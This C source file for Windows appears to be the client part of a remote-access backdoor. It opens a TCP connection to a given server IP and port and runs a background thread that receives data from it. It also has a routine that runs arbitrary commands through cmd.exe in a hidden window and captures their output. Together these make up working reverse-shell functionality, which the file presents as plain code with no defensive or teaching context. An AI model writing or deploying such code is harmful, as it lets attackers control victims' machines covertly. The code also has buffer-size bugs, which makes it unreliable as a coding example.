
#include "main.h"

SOCKET ClientSocket;
char revcBuf[MAX_PATH] = { 0 };


BOOL ConnectionPrepare(const char* ServerIP, int Port)
{

	WSADATA wsaData = { 0 };
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	ClientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == ClientSocket)
	{
		return FALSE;
	}

	sockaddr_in addr = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_port = htons(Port);
	addr.sin_addr.S_un.S_addr = inet_addr(ServerIP);

	if (0 != connect(ClientSocket, (sockaddr*)(&addr), sizeof(addr)))
	{
		return FALSE;
	}

	// 创建子线程接收数据
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RecvThreadProc, NULL, NULL, NULL);

	return TRUE;
}


void SendMsg(char* pszSend)
{

	send(ClientSocket, pszSend, (1 + lstrlen(pszSend)), 0);
	printf("【SEND】%s\n", pszSend);
}



void RecvMsg()
{
	
	while (TRUE)
	{
		int iRet = recv(ClientSocket, revcBuf, MAX_PATH, 0);
	}
}

char* returnRevc()
{
	return revcBuf;
}

UINT RecvThreadProc(LPVOID lpVoid)
{
	RecvMsg();
	return 0;
}

BOOL PipeCmd(char* pszCmd, char* pszResultBuffer, DWORD dwResultBufferSize)
{
	char cmdline[60];
	char cmdpath[500] = "/k ";
	HANDLE hReadPipe = NULL;
	HANDLE hWritePipe = NULL;
	SECURITY_ATTRIBUTES SA = { 0 };
	BOOL bRet = FALSE;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	SA.bInheritHandle = TRUE;
	SA.nLength = sizeof(SA);
	SA.lpSecurityDescriptor = NULL;

	bRet = CreatePipe(&hReadPipe, &hWritePipe, &SA, 0);
	if (FALSE == bRet)
	{
		printf("CreatePipe Error!");
		return FALSE;
	}

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;

	GetSystemDirectory(cmdline, MAX_PATH + 1);
	strcat(cmdline, "\\cmd.exe");
	strcat(cmdpath, pszCmd);
	bRet = CreateProcess(cmdline, cmdpath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	if (FALSE == bRet)
	{
		printf("CreateProcess Error!");
	}

	WaitForSingleObject(pi.hThread, INFINITE);
	WaitForSingleObject(pi.hProcess, INFINITE);

	RtlZeroMemory(pszResultBuffer, dwResultBufferSize);
	ReadFile(hReadPipe, pszResultBuffer, dwResultBufferSize, NULL, NULL);


	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(hWritePipe);
	CloseHandle(hReadPipe);

	return TRUE;
}
